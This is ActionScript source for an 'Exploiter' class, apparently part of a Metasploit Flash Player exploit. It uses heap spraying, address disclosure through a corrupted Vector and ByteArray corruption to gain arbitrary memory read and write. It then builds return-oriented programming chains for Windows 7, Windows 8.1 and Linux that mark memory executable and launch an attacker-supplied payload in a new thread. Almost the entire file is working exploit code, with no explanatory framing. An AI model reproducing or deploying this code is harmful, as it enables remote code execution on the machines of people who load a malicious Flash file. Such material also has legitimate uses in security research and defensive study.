package
{ 
    import flash.utils.ByteArray
    import flash.system.System

    public class Exploiter
    {
        private const VECTOR_OBJECTS_LENGTH:uint = 1014
        private var exploit:Exploit
        private var ev:ExploitVector
        private var eba:ExploitByteArray
        private var payload:ByteArray
        private var platform:String
        private var op_system:String
        private var pos:uint
        private var byte_array_object:uint
        private var main:uint
        private var stack_object:uint
        private var payload_space_object:uint
        private var buffer_object:uint
        private var buffer:uint
        private var vtable:uint
        private var stack_address:uint
        private var payload_address:uint 
        private var stack:Vector.<uint> = new Vector.<uint>(0x6400)
        private var payload_space:Vector.<uint> = new Vector.<uint>(0x6400) 
        private var spray:Vector.<Object> = new Vector.<Object>(90000)

        public function Exploiter(exp:Exploit, pl:String, os:String, p:ByteArray, uv:Vector.<uint>, uv_length:uint):void
        {
            exploit = exp
            payload = p
            platform = pl
            op_system = os

            ev = new ExploitVector(uv, uv_length)
            if (!ev.is_ready()) return
            eba = new ExploitByteArray(platform)
            spray_objects()
            try { pos = search_objects() } catch (err:Error) { ev.restore(); cleanup(); return; }
            ev.set_own_address(pos)
            if (!disclose_objects()) { ev.restore(); cleanup(); return; }
            disclose_addresses()
            corrupt_byte_array()
            if (!eba.is_ready()) { ev.restore(); cleanup(); return }
            do_rop()
            restore_byte_array()
            ev.restore()
            cleanup()
        }

        private function spray_objects():void
        {
            Logger.log("[*] Exploiter - spray_objects()")
            for (var i:uint = 0; i < spray.length; i++) 
            {
                spray[i] = new Vector.<Object>(VECTOR_OBJECTS_LENGTH)
                spray[i][0] = eba.ba
                spray[i][1] = exploit 
                spray[i][2] = stack
                spray[i][3] = payload_space
            } 
        }
        
        private function search_objects():uint
        {
            Logger.log("[*] Exploiter - search_objects()")
            var idx:uint = ev.search_pattern(VECTOR_OBJECTS_LENGTH, 0xac100)
            return idx + 1
        }

        private function disclose_objects():Boolean
        { 
            Logger.log("[*] Exploiter - disclose_objects()")
            byte_array_object = ev.at(pos) - 1
            main = ev.at(pos + 1) - 1
            stack_object = ev.at(pos + 2) - 1
            payload_space_object = ev.at(pos + 3) - 1
            if (byte_array_object < 0x1000 || main < 0x1000 || stack_object < 0x1000 || payload_space_object < 0x1000) {
                return false
            }
            return true
        }

        private function disclose_addresses():void
        {
            Logger.log("[*] Exploiter - disclose_addresses()")
            if (platform == "linux") 
            {
                buffer_object = ev.read(byte_array_object + 0x10)
                buffer = ev.read(buffer_object + 0x1c)
            }    
            else if (platform == "win") 
            {
                buffer_object = ev.read(byte_array_object + 0x40)
                buffer = ev.read(buffer_object + 8)
            }
            vtable = ev.read(main)
            stack_address = ev.read(stack_object + 0x18)
            payload_address = ev.read(payload_space_object + 0x18)
        }
        
        private function corrupt_byte_array():void
        {
            Logger.log("[*] Exploiter - corrupt_byte_array(): " + platform)
            if (platform == "linux")
            {
                ev.write(buffer_object + 0x1c) // *array
                ev.write(buffer_object + 0x20, 0xffffffff) // capacity
            } 
            else if (platform == "win")
            {
                ev.write(buffer_object + 8) // *array
                ev.write(buffer_object + 16, 0xffffffff) // capacity
            }
            eba.lets_ready()
        }

        private function restore_byte_array():void
        { 
            Logger.log("[*] Exploiter - restore_byte_array(): " + platform)
            if (platform == "linux")
            {
                ev.write(buffer_object + 0x1c, buffer) // *array
                ev.write(buffer_object + 0x20, 1024) // capacity
            } 
            else if (platform == "win")
            {
                ev.write(buffer_object + 8, buffer) // *array
                ev.write(buffer_object + 16, 1024) // capacity
            }
            eba.set_length(eba.original_length) 
        }
        
        private function do_rop():void
        {
            Logger.log("[*] Exploiter - do_rop()")
            if (platform == "linux") {
                do_rop_linux()
            } else if (platform == "win") {
                if (op_system == "Windows 8.1") {
                    do_rop_windows8()
                } else if (op_system == "Windows 7") {
                    do_rop_windows()
                } else {
                    return
                }
            } else {
                return
            }
        }

        private function do_rop_windows():void
        {
            Logger.log("[*] Exploiter - do_rop_windows()")
            var pe:PE = new PE(eba)
            var flash:uint = pe.base(vtable)
            var winmm:uint = pe.module("winmm.dll", flash)
            var kernel32:uint = pe.module("kernel32.dll", winmm)            
            var ntdll:uint = pe.module("ntdll.dll", kernel32)
            var virtualprotect:uint = pe.procedure("VirtualProtect", kernel32)
            var virtualalloc:uint = pe.procedure("VirtualAlloc", kernel32)
            var createthread:uint = pe.procedure("CreateThread", kernel32)
            var memcpy:uint = pe.procedure("memcpy", ntdll)
            var xchgeaxespret:uint = pe.gadget("c394", 0x0000ffff, flash)
            var xchgeaxesiret:uint = pe.gadget("c396", 0x0000ffff, flash)
            var addespcret:uint = pe.gadget("c30cc483", 0xffffffff, ntdll)
            
            // Continuation of execution
            eba.write(buffer + 0x10, "\xb8", false); eba.write(0, vtable, false) // mov eax, vtable
            eba.write(0, "\xbb", false); eba.write(0, main, false) // mov ebx, main
            eba.write(0, "\x89\x03", false) // mov [ebx], eax
            eba.write(0, "\x87\xf4\xc3", false) // xchg esp, esi # ret

            // Put the payload (command) in memory
            eba.write(payload_address + 8, payload, true); // payload

            // Put the fake vtabe / stack on memory
            eba.write(stack_address + 0x18070, xchgeaxespret) // Initial gadget (stackpivot); from @hdarwin89 sploits, kept for reliability...
            eba.write(stack_address + 0x180a4, xchgeaxespret) // Initial gadget (stackpivot); call    dword ptr [eax+0A4h]
            eba.write(stack_address + 0x18000, xchgeaxesiret) // fake vtable; also address will become stack after stackpivot
            eba.write(0, virtualprotect)

            // VirtualProtect
            eba.write(0, virtualalloc)
            eba.write(0, buffer + 0x10)
            eba.write(0, 0x1000)
            eba.write(0, 0x40)
            eba.write(0, buffer + 0x8) // Writable address (4 bytes)

            // VirtualAlloc
            eba.write(0, memcpy)
            eba.write(0, 0x7f6e0000)
            eba.write(0, 0x4000)
            eba.write(0, 0x1000 | 0x2000) // MEM_COMMIT | MEM_RESERVE
            eba.write(0, 0x40) // PAGE_EXECUTE_READWRITE

            // memcpy
            eba.write(0, addespcret) // stack pivot over arguments because ntdll!memcpy doesn't
            eba.write(0, 0x7f6e0000)
            eba.write(0, payload_address + 8)
            eba.write(0, payload.length) 

            // CreateThread
            eba.write(0, createthread)
            eba.write(0, buffer + 0x10) // return to fix things
            eba.write(0, 0)
            eba.write(0, 0)
            eba.write(0, 0x7f6e0000)
            eba.write(0, 0)
            eba.write(0, 0)
            eba.write(0, 0)
           
            eba.write(main, stack_address + 0x18000) // overwrite with fake vtable
            exploit.toString() // call method in the fake vtable
        }

        private function do_rop_windows8():void
        {
            Logger.log("[*] Exploiter - do_rop_windows8()")
            var pe:PE = new PE(eba)
            var flash:uint = pe.base(vtable)
            var winmm:uint = pe.module("winmm.dll", flash)
            var advapi32:uint = pe.module("advapi32.dll", flash)
            var kernelbase:uint = pe.module("kernelbase.dll", advapi32)
            var kernel32:uint = pe.module("kernel32.dll", winmm) 
            var ntdll:uint = pe.module("ntdll.dll", kernel32)
            var virtualprotect:uint = pe.procedure("VirtualProtect", kernelbase)
            var virtualalloc:uint = pe.procedure("VirtualAlloc", kernelbase)
            var createthread:uint = pe.procedure("CreateThread", kernelbase)
            var memcpy:uint = pe.procedure("memcpy", ntdll)
            var xchgeaxespret:uint = pe.gadget("c394", 0x0000ffff, flash)
            var xchgeaxesiret:uint = pe.gadget("c396", 0x0000ffff, flash)
            var addespcret:uint = pe.gadget("c30cc483", 0xffffffff, ntdll)
            
            // Continuation of execution
            eba.write(buffer + 0x10, "\xb8", false); eba.write(0, vtable, false) // mov eax, vtable
            eba.write(0, "\xbb", false); eba.write(0, main, false) // mov ebx, main
            eba.write(0, "\x89\x03", false) // mov [ebx], eax
            eba.write(0, "\x87\xf4\xc3", false) // xchg esp, esi # ret

            // Put the payload (command) in memory
            eba.write(payload_address + 8, payload, true); // payload

            // Put the fake vtabe / stack on memory
            eba.write(stack_address + 0x18070, xchgeaxespret) // Initial gadget (stackpivot); from @hdarwin89 sploits, kept for reliability...
            eba.write(stack_address + 0x180a4, xchgeaxespret) // Initial gadget (stackpivot); call    dword ptr [eax+0A4h]
            eba.write(stack_address + 0x18000, xchgeaxesiret) // fake vtable; also address will become stack after stackpivot
            eba.write(0, virtualprotect)

            // VirtualProtect
            eba.write(0, virtualalloc)
            eba.write(0, buffer + 0x10)
            eba.write(0, 0x1000)
            eba.write(0, 0x40)
            eba.write(0, buffer + 0x8) // Writable address (4 bytes)

            // VirtualAlloc
            eba.write(0, memcpy)
            eba.write(0, 0x7ffd0000)
            eba.write(0, 0x4000)
            eba.write(0, 0x1000 | 0x2000) // MEM_COMMIT | MEM_RESERVE
            eba.write(0, 0x40) // PAGE_EXECUTE_READWRITE

            // memcpy
            eba.write(0, addespcret) // stack pivot over arguments because ntdll!memcpy doesn't
            eba.write(0, 0x7ffd0000)
            eba.write(0, payload_address + 8)
            eba.write(0, payload.length) 

            // CreateThread
            eba.write(0, createthread)
            eba.write(0, buffer + 0x10) // return to fix things
            eba.write(0, 0)
            eba.write(0, 0)
            eba.write(0, 0x7ffd0000)
            eba.write(0, 0)
            eba.write(0, 0)
            eba.write(0, 0)

            eba.write(main, stack_address + 0x18000) // overwrite with fake vtable
            exploit.toString() // call method in the fake vtable
        }

        private function do_rop_linux():void
        {
            Logger.log("[*] Exploiter - do_rop_linux()")
            var flash:Elf = new Elf(eba, vtable)
            var feof:uint = flash.external_symbol('feof')
            var libc:Elf = new Elf(eba, feof)
            var popen:uint = libc.symbol("popen")
            var mprotect:uint = libc.symbol("mprotect")
            var mmap:uint = libc.symbol("mmap")
            var clone:uint = libc.symbol("clone")
            var xchgeaxespret:uint = flash.gadget("c394", 0x0000ffff)
            var xchgeaxesiret:uint = flash.gadget("c396", 0x0000ffff)
            var addesp2cret:uint = flash.gadget("c32cc483", 0xffffffff)

            // Continuation of execution
            // 1) Recover original vtable
            eba.write(buffer + 0x10, "\xb8", false); eba.write(0, vtable, false) // mov eax, vtable
            eba.write(0, "\xbb", false); eba.write(0, main, false) // mov ebx, main
            eba.write(0, "\x89\x03", false) // mov [ebx], eax
            // 2) Recover original stack
            eba.write(0, "\x87\xf4\xc3", false) // xchg esp, esi

            // my_memcpy
            eba.write(buffer + 0x60, "\x56", false) // push esi
            eba.write(0, "\x57", false)             // push edi
            eba.write(0, "\x51", false)             // push ecx
            eba.write(0, "\x8B\x7C\x24\x10", false) // mov edi,[esp+0x10]
            eba.write(0, "\x8B\x74\x24\x14", false) // mov esi,[esp+0x14]
            eba.write(0, "\x8B\x4C\x24\x18", false) // mov ecx,[esp+0x18]
            eba.write(0, "\xF3\xA4", false)         // rep movsb 
            eba.write(0, "\x59", false)             // pop ecx
            eba.write(0, "\x5f", false)             // pop edi
            eba.write(0, "\x5e", false)             // pop esi
            eba.write(0, "\xc3", false)             // ret

            // Put the popen parameters in memory
            eba.write(payload_address + 0x8, payload, true) // false
           
            // Put the fake stack/vtable on memory 
            eba.write(stack_address + 0x18024, xchgeaxespret) // Initial gadget, stackpivot
            eba.write(stack_address + 0x18000, xchgeaxesiret) // Save original stack on esi
            eba.write(0, addesp2cret) //second pivot to preserver stack_address + 0x18024

            // Return to mprotect()
            eba.write(stack_address + 0x18034, mprotect)
            // Return to stackpivot (jmp over mprotect parameters)
            eba.write(0, addesp2cret)
            // mprotect() arguments
            eba.write(0, buffer) // addr
            eba.write(0, 0x1000) // size
            eba.write(0, 0x7)    // PROT_READ | PROT_WRITE | PROT_EXEC

            // Return to mmap()
            eba.write(stack_address + 0x18068, mmap)
            // Return to stackpivot (jmp over mmap parameters)
            eba.write(0, addesp2cret)
            // mmap() code segment arguments
            eba.write(0, 0x70000000) // 0x70000000
            eba.write(0, 0x4000) // size
            eba.write(0, 0x7) // PROT_READ | PROT_WRITE | PROT_EXEC
            eba.write(0, 0x22) // MAP_PRIVATE | MAP_ANONYMOUS
            eba.write(0, 0xffffffff) // filedes
            eba.write(0, 0) // offset

            // Return to mmap()
            eba.write(stack_address + 0x1809c, mmap)
            // Return to stackpivot (jmp over mmap parameters)
            eba.write(0, addesp2cret)
            // mmap() stack segment arguments
            eba.write(0, 0x70008000) // NULL
            eba.write(0, 0x10000) // size
            eba.write(0, 0x7) // PROT_READ | PROT_WRITE | PROT_EXEC
            eba.write(0, 0x22) // MAP_PRIVATE | MAP_ANONYMOUS
            eba.write(0, -1) // filedes
            eba.write(0, 0) // offset

            // Return to memcpy()
            eba.write(stack_address + 0x180d0, buffer + 0x60)
            // Return to stackpivot (jmp over memcpy parameters)
            eba.write(0, addesp2cret)
            // memcpy() parameters
            eba.write(0, 0x70000000)
            eba.write(0, payload_address + 0x8)
            eba.write(0, payload.length)

            // Return to clone()
            eba.write(stack_address + 0x18104, clone)
            // Return to CoE (fix stack and object vtable)
            eba.write(0, buffer + 0x10)
            // clone() arguments
            eba.write(0, 0x70000000) // code
            eba.write(0, 0x7000bff0) // stack
            eba.write(0, 0x00000100) // flags CLONE_VM
            eba.write(0, 0)          // args
           
            //call   DWORD PTR [eax+0x24]
            //EAX: 0x41414141 ('AAAA')
            //EDI: 0xad857088 ("AAAA\377")
            eba.write(main, stack_address + 0x18000)
            exploit.hasOwnProperty('msf')
        }

        private function cleanup():void
        { 
            Logger.log("[*] Exploiter - cleanup()")
            spray = null
            stack = null
            payload_space = null
            eba = null
            ev = null
            exploit = null
            System.pauseForGCIfCollectionImminent(0)
        }
    }
}